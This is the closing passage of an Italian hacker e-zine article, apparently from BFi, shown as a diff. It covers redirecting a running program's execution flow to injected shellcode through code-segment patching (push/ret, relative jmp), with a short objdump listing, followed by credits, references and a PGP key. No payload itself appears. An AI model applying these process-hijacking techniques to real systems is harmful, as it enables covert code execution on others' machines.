+Avviamo objdump su test2 e vediamo cosa esce (il disassembling dovrebbe avere
+un aspetto famigliare... e' lo stesso che abbiamo visto prima :)).
+
+twiz@twiz:~$ objdump -d test > temp
+twiz@twiz:~$
+
+Scorrendo temp ci imbattiamo in :
+
+ 804844e:       83 c4 10                add    $0x10,%esp
+ 8048451:       68 de 94 04 08          push   $0x80494de
+ 8048456:       c3                      ret
+     
+Che , guarda caso, e' proprio la modifica che abbiamo fatto... ma a 0x80494de 
+non c'e' piu' il nostro shellcode (data segment volatile) e quindi incorriamo 
+nel segfault. 
+E' evidente, dunque, che e' necessario fare una qualche copia di backup della 
+parte di codesegment modificata (e datasegment, qualora non si voglia stoppare
+e riavviare il programma), ad esempio utilizzando dei file locali (dandogli
+nome pid.codeseg / pid.data o simile) e aggiungendo un'opzione a fakeflow.c,
+ad esempio -restore, che si occupi appunto di rimettere a posto il tutto.
+Come gia' detto questo intento non viene portato avanti nel proof of concept,
+ma viene lasciato a voi :)
+
+Abbiamo visto che e' possibile modificare il flow del programma, abbiamo visto
+due modi possibili per farlo (via pushl/ret e via jmp relativo), abbiamo visto
+dove e' possibile copiare lo shellcode da usare (nel data segment)... questo 
+non significa che queste siano le uniche possibilita' disponibili.
+Ad esempio, guardando il disassemblato, vi accorgerete che ci sono alcune
+lunghe serie di nop ("\x90"), anche una decina di bytes... non ci stara' uno
+shellcode, ma magari qualche semplice istruzione si'.
+Insomma, il limite, come al solito, e' la vostra inventiva/originalita' (oltre
+che le skills personali :)).
+
+FINE POSTMESSA
+
+
+---] Ringraziamenti / Shotouts
+
+Il primo, doveroso, ringraziamento va a vecna: dictracy e tutti i successivi
+codici hanno preso spunto dalle idee proposte in rmfbd.
+Un saluto a Ritz (con ringraziamento per il beta-testing) e ai ragazzi del
+racl (http://racl.oltrelinux.com, ora in una nuova veste grafica... sembra un
+messaggio pubblicitario :)).
+Si ringraziano anche i ragazzi di #kernelnewbies su OpenProjects.
+Ultimo, ringrazio mammon_ per le discussioni riguardo alle libdisasm, i
+consigli e la modifiche accettate e apportate alle libdisasm.
+
+
+---] Riferimenti
+
+[1] - RAPE MEM0RY F0R BETTER DiNNER - by vecna - BFi11-dev - file 06
+      http://www.s0ftpj.org/bfi/dev/BFi11-dev-06
+
+[2] - MEMORY MANAGEMENT NEI PROCESSORI i386 IN PROTECTED MODE - by Ritz
+      BFi numero 9, anno 3 - 03/11/2000 - file 19 di 21
+      http://www.s0ftpj.org/bfi/online/bfi9/BFi09-19
+
+[3] - Cache and TLB Flushing Under Linux - by David S. Miller 
+      /usr/src/linux/Documentation/cachetlb.txt
+
+[4] - KERNEL FUNCTION HIJACKING - by Silvio Cesare <silvio@big.net.au>
+      http://www.big.net.au/~silvio/kernel-hijack.txt
+ 
+[5] - EXECUTABLE AND LINKABLE FORMAT (ELF)
+      Portable Formats Specification, Version 1.1
+      Tool Interface Standards (TIS) - txt version by Brian Raiter
+      http://www.muppetlabs.com/~breadbox/software/ELF.txt
+
+
+
+-[ WEB ]----------------------------------------------------------------------
+
+        http://www.bfi.cx
+        http://www.s0ftpj.org/bfi/
+        http://bfi.itapac.net
+
+
+-[ E-MAiL ]-------------------------------------------------------------------
+
+        bfi@s0ftpj.org
+
+
+-[ PGP ]----------------------------------------------------------------------
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.3i
+mQENAzZsSu8AAAEIAM5FrActPz32W1AbxJ/LDG7bB371rhB1aG7/AzDEkXH67nni
+DrMRyP+0u4tCTGizOGof0s/YDm2hH4jh+aGO9djJBzIEU8p1dvY677uw6oVCM374
+nkjbyDjvBeuJVooKo+J6yGZuUq7jVgBKsR0uklfe5/0TUXsVva9b1pBfxqynK5OO
+lQGJuq7g79jTSTqsa0mbFFxAlFq5GZmL+fnZdjWGI0c2pZrz+Tdj2+Ic3dl9dWax
+iuy9Bp4Bq+H0mpCmnvwTMVdS2c+99s9unfnbzGvO6KqiwZzIWU9pQeK+v7W6vPa3
+TbGHwwH4iaAWQH0mm7v+KdpMzqUPucgvfugfx+kABRO0FUJmSTk4IDxiZmk5OEB1
+c2EubmV0PokBFQMFEDZsSu+5yC9+6B/H6QEBb6EIAMRP40T7m4Y1arNkj5enWC/b
+a6M4oog42xr9UHOd8X2cOBBNB8qTe+dhBIhPX0fDJnnCr0WuEQ+eiw0YHJKyk5ql
+GB/UkRH/hR4IpA0alUUjEYjTqL5HZmW9phMA9xiTAqoNhmXaIh7MVaYmcxhXwoOo
+WYOaYoklxxA5qZxOwIXRxlmaN48SKsQuPrSrHwTdKxd+qB7QDU83h8nQ7dB4MAse
+gDvMUdspekxAX8XBikXLvVuT0ai4xd8o8owWNR5fQAsNkbrdjOUWrOs0dbFx2K9J
+l3XqeKl3XEgLvVG8JyhloKl65h9rUyw6Ek5hvb5ROuyS/lAGGWvxv2YJrN8ABLo=
+=o7CG
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+==============================================================================
+-----------------------------------[ EOF ]------------------------------------
+==============================================================================
